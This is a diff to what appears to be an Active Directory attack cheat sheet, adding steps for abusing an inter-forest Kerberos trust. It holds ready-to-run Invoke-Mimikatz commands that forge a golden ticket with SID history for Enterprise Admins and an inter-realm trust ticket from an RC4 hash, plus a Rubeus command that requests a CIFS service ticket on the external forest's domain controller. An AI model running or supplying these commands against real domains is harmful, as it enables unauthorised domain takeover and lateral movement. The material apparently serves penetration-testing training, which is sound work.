@@ -878,7 +878,16 @@ krbtgt -
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:child.parent.lab /sid:S-1-5-21-<currentdomainSID> /sids:S-1-5-21-<parentdomainSID>-519 /krbtgt:f052addf1d43f864a7d0c21cbce440c9 /ticket:C:\Temp\krbtgt_tkt.kirbi"'
 ```
 #### Across Forests - Inter-Forest Trust
-There is SID filtering across forests so abusing SID history to force ```/-519``` for Enterprise Admins will not work when abusing external forest trusts.
+There is SID filtering across forests so abusing SID history to force ```/-519``` for Enterprise Admins will not work when abusing external forest trusts. Other than that it is the same:
+
+```
+Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:child.parent.local /sid:S-1-5-21-1874506631-3219952063-538504511 /rc4:cd3fb1b0b49c7a56d285ffdbb1304431 /service:krbtgt /target:external.local /ticket:C:\Temp\trust_forest_tkt.kirbi"'
+```
+
+ We can then request a TGS for any service located within the External Forest having established trust:
+
+```.\Rubeus asktgs C:\Temp\trust_forest_tkt.kirbi CIFS/dc01.external.local```
+
 
 # MS SQL
 
